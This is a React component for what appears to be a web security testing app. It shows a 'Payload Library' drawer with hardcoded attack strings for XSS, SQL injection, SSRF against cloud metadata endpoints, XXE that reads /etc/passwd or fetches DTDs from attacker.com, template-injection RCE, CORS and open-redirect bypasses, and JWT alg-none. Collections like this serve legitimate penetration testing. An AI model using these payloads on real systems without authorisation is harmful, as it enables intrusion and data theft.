import { useEffect, useMemo, useState } from "react";
import { Sheet, SheetContent, SheetHeader, SheetTitle } from "@/components/ui/sheet";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Copy, Send, Plus } from "lucide-react";
import { toast } from "sonner";
import { setStudioPayload } from "@/lib/studio-bus";
import { supabase } from "@/integrations/supabase/client";
import { useNavigate } from "@tanstack/react-router";

const CATEGORIES = ["XSS","SQLi","SSRF","XXE","SSTI","Open Redirect","IDOR","CORS","GraphQL","Auth Bypass","Custom"] as const;
type Cat = typeof CATEGORIES[number];

type P = { payload: string; tag: string };
const LIB: Record<Exclude<Cat, "Custom">, P[]> = {
  XSS: [
    { payload: `<script>alert(1)</script>`, tag: "reflected" },
    { payload: `"><svg onload=alert(1)>`, tag: "reflected" },
    { payload: `<img src=x onerror=alert(1)>`, tag: "stored" },
    { payload: `javascript:alert(1)`, tag: "DOM" },
    { payload: `<iframe src="javascript:alert(1)">`, tag: "stored" },
    { payload: `'-alert(1)-'`, tag: "reflected" },
    { payload: `<body onload=alert(1)>`, tag: "DOM" },
    { payload: `<a href="javascript:alert(1)">x</a>`, tag: "stored" },
  ],
  SQLi: [
    { payload: `' OR '1'='1'-- -`, tag: "auth-bypass" },
    { payload: `1' UNION SELECT NULL,version()-- -`, tag: "union" },
    { payload: `1' AND SLEEP(5)-- -`, tag: "time-based" },
    { payload: `1' AND 1=CONVERT(int,@@version)-- -`, tag: "error-based" },
    { payload: `admin'--`, tag: "auth-bypass" },
    { payload: `1 OR 1=1`, tag: "boolean" },
    { payload: `'; WAITFOR DELAY '0:0:5'-- -`, tag: "time-based" },
    { payload: `1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -`, tag: "blind" },
  ],
  SSRF: [
    { payload: `http://169.254.169.254/latest/meta-data/`, tag: "aws-metadata" },
    { payload: `http://metadata.google.internal/computeMetadata/v1/`, tag: "gcp-metadata" },
    { payload: `http://127.0.0.1:6379/`, tag: "redis" },
    { payload: `file:///etc/passwd`, tag: "file-scheme" },
    { payload: `gopher://127.0.0.1:11211/_stats`, tag: "memcached" },
    { payload: `http://[::1]/`, tag: "ipv6-loopback" },
    { payload: `http://0.0.0.0/`, tag: "loopback-bypass" },
    { payload: `http://localhost@evil.com/`, tag: "userinfo-bypass" },
  ],
  XXE: [
    { payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`, tag: "classic" },
    { payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/x">]><foo>&xxe;</foo>`, tag: "OOB" },
    { payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/dtd">%xxe;]>`, tag: "parameter-entity" },
    { payload: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>`, tag: "RCE" },
    { payload: `<!ENTITY % lol "lol"><!ENTITY % lol2 "%lol;%lol;">`, tag: "billion-laughs" },
    { payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>`, tag: "php-wrapper" },
    { payload: `<!DOCTYPE foo SYSTEM "http://attacker.com/x.dtd">`, tag: "external-dtd" },
    { payload: `<?xml version="1.0" encoding="UTF-8"?><foo>&xxe;</foo>`, tag: "fragment" },
  ],
  SSTI: [
    { payload: `{{7*7}}`, tag: "jinja2" },
    { payload: `${'{'}7*7${'}'}`, tag: "freemarker" },
    { payload: `<%= 7*7 %>`, tag: "erb" },
    { payload: `{{config.items()}}`, tag: "jinja2-leak" },
    { payload: `{{''.__class__.__mro__[1].__subclasses__()}}`, tag: "python-rce" },
    { payload: `${7*7}`, tag: "thymeleaf" },
    { payload: `*{7*7}`, tag: "thymeleaf-selection" },
    { payload: `#{7*7}`, tag: "spring-el" },
  ],
  "Open Redirect": [
    { payload: `//evil.com`, tag: "schemeless" },
    { payload: `///evil.com`, tag: "triple-slash" },
    { payload: `https://evil.com`, tag: "absolute" },
    { payload: `//evil.com/%2f..`, tag: "path-bypass" },
    { payload: `/\\evil.com`, tag: "backslash-bypass" },
    { payload: `https://victim.com@evil.com`, tag: "userinfo" },
    { payload: `javascript:alert(1)`, tag: "javascript-scheme" },
    { payload: `//evil%E3%80%82com`, tag: "unicode-dot" },
  ],
  IDOR: [
    { payload: `/api/users/1/profile`, tag: "horizontal" },
    { payload: `/api/users/../admin`, tag: "path-traversal" },
    { payload: `?user_id=2`, tag: "param" },
    { payload: `{"user_id":2}`, tag: "body" },
    { payload: `/api/orders/00000000-0000-0000-0000-000000000001`, tag: "uuid" },
    { payload: `X-User-Id: 2`, tag: "header" },
    { payload: `/admin/users/1`, tag: "vertical" },
    { payload: `?role=admin`, tag: "role-tamper" },
  ],
  CORS: [
    { payload: `Origin: https://evil.com`, tag: "wildcard-test" },
    { payload: `Origin: null`, tag: "null-origin" },
    { payload: `Origin: https://victim.com.evil.com`, tag: "suffix-bypass" },
    { payload: `Origin: https://evil.victim.com`, tag: "subdomain" },
    { payload: `Origin: file://`, tag: "file-origin" },
    { payload: `Origin: https://victim_com.evil.com`, tag: "underscore" },
    { payload: `Origin: https://VICTIM.com`, tag: "case-bypass" },
    { payload: `Origin: https://victim.com.attacker.com`, tag: "domain-confusion" },
  ],
  GraphQL: [
    { payload: `query { __schema { types { name } } }`, tag: "introspection" },
    { payload: `query { __schema { queryType { fields { name } } } }`, tag: "field-discovery" },
    { payload: `mutation { login(user:"admin",pass:"' OR 1=1--") { token } }`, tag: "sqli" },
    { payload: `query { user(id:"1' OR '1'='1") { id email } }`, tag: "injection" },
    { payload: `query a { user(id:1){email} } query b { user(id:2){email} }`, tag: "batch" },
    { payload: `query { users { ...on User { email password } } }`, tag: "fragment" },
    { payload: `{"query":"query{users{id email}}"}`, tag: "post-body" },
    { payload: `?query=query{users{id}}`, tag: "get-method" },
  ],
  "Auth Bypass": [
    { payload: `X-Original-URL: /admin`, tag: "header-rewrite" },
    { payload: `X-Rewrite-URL: /admin`, tag: "header-rewrite" },
    { payload: `X-Forwarded-For: 127.0.0.1`, tag: "ip-spoof" },
    { payload: `X-Real-IP: 127.0.0.1`, tag: "ip-spoof" },
    { payload: `/admin/..;/`, tag: "tomcat" },
    { payload: `/admin/%2e%2e/`, tag: "encoded-traversal" },
    { payload: `Authorization: Bearer null`, tag: "null-token" },
    { payload: `{"alg":"none"}`, tag: "jwt-none" },
  ],
};

type CustomRow = { id: string; category: string | null; payload: string | null; context_tag: string | null };

export function openPayloads() {
  if (typeof window === "undefined") return;
  window.dispatchEvent(new Event("kelsai:open-payloads"));
}

export function PayloadLibraryHost() {
  const [open, setOpen] = useState(false);
  const [cat, setCat] = useState<Cat>("XSS");
  const [q, setQ] = useState("");
  const [custom, setCustom] = useState<CustomRow[]>([]);
  const [newP, setNewP] = useState({ payload: "", category: "XSS", context_tag: "" });
  const navigate = useNavigate();

  useEffect(() => {
    function onOpen() { setOpen(true); }
    function onKey(e: KeyboardEvent) {
      if (e.shiftKey && (e.key === "P" || e.key === "p") && !e.metaKey && !e.ctrlKey) {
        const t = e.target as HTMLElement | null;
        if (t && (t.tagName === "INPUT" || t.tagName === "TEXTAREA" || t.isContentEditable)) return;
        e.preventDefault();
        setOpen(true);
      }
    }
    window.addEventListener("kelsai:open-payloads", onOpen);
    window.addEventListener("keydown", onKey);
    return () => {
      window.removeEventListener("kelsai:open-payloads", onOpen);
      window.removeEventListener("keydown", onKey);
    };
  }, []);

  useEffect(() => {
    if (!open) return;
    supabase.from("custom_payloads").select("*").order("created_at", { ascending: false })
      .then(({ data }) => setCustom((data as CustomRow[]) ?? []));
  }, [open]);

  const rows = useMemo(() => {
    if (cat === "Custom") {
      return custom.filter(c => !q || (c.payload ?? "").toLowerCase().includes(q.toLowerCase()))
        .map(c => ({ payload: c.payload ?? "", tag: c.context_tag ?? "" }));
    }
    return LIB[cat].filter(p => !q || p.payload.toLowerCase().includes(q.toLowerCase()));
  }, [cat, q, custom]);

  async function addCustom() {
    if (!newP.payload.trim()) return;
    const { data } = await supabase.from("custom_payloads").insert(newP).select().single();
    if (data) setCustom([data as CustomRow, ...custom]);
    setNewP({ payload: "", category: cat === "Custom" ? "XSS" : cat, context_tag: "" });
    toast.success("Saved payload");
  }

  function sendToStudio(p: string) {
    setStudioPayload(p);
    setOpen(false);
    navigate({ to: "/studio" });
    toast.success("Sent to Studio");
  }

  return (
    <Sheet open={open} onOpenChange={setOpen}>
      <SheetContent className="w-full sm:max-w-2xl overflow-y-auto">
        <SheetHeader>
          <SheetTitle>Payload Library</SheetTitle>
        </SheetHeader>
        <div className="mt-4 space-y-3">
          <Input placeholder="Search payloads..." value={q} onChange={e => setQ(e.target.value)} />
          <div className="flex flex-wrap gap-1.5">
            {CATEGORIES.map(c => (
              <button
                key={c}
                onClick={() => setCat(c)}
                className={`rounded-md px-2.5 py-1 text-xs transition-colors ${
                  cat === c
                    ? "bg-[color:var(--primary)]/15 text-[color:var(--primary)] border border-[color:var(--primary)]/40"
                    : "bg-white/[0.03] text-muted-foreground hover:bg-white/[0.06] border border-[color:var(--glass-border)]"
                }`}
              >{c}</button>
            ))}
          </div>

          {cat === "Custom" && (
            <div className="glass p-3 space-y-2">
              <Textarea placeholder="Custom payload..." value={newP.payload} onChange={e => setNewP({ ...newP, payload: e.target.value })} className="font-mono text-xs h-20" />
              <div className="flex gap-2">
                <Input placeholder="context tag" value={newP.context_tag} onChange={e => setNewP({ ...newP, context_tag: e.target.value })} className="flex-1" />
                <Input placeholder="category" value={newP.category} onChange={e => setNewP({ ...newP, category: e.target.value })} className="w-32" />
                <Button size="sm" onClick={addCustom}><Plus className="h-3.5 w-3.5 mr-1" />Add</Button>
              </div>
            </div>
          )}

          <div className="space-y-2">
            {rows.length === 0 && <div className="glass p-6 text-center text-sm text-muted-foreground">No payloads.</div>}
            {rows.map((p, i) => (
              <div key={i} className="glass p-3">
                <div className="flex items-start gap-2">
                  <pre className="flex-1 font-mono text-[11px] whitespace-pre-wrap break-all text-foreground/90">{p.payload}</pre>
                  <div className="flex flex-col gap-1 shrink-0">
                    <Button size="sm" variant="ghost" onClick={() => { navigator.clipboard.writeText(p.payload); toast.success("Copied"); }}>
                      <Copy className="h-3.5 w-3.5" />
                    </Button>
                    <Button size="sm" variant="ghost" onClick={() => sendToStudio(p.payload)}>
                      <Send className="h-3.5 w-3.5" />
                    </Button>
                  </div>
                </div>
                {p.tag && <div className="mt-1 inline-block rounded bg-white/5 px-1.5 py-0.5 font-mono text-[10px] text-muted-foreground">{p.tag}</div>}
              </div>
            ))}
          </div>
        </div>
      </SheetContent>
    </Sheet>
  );
}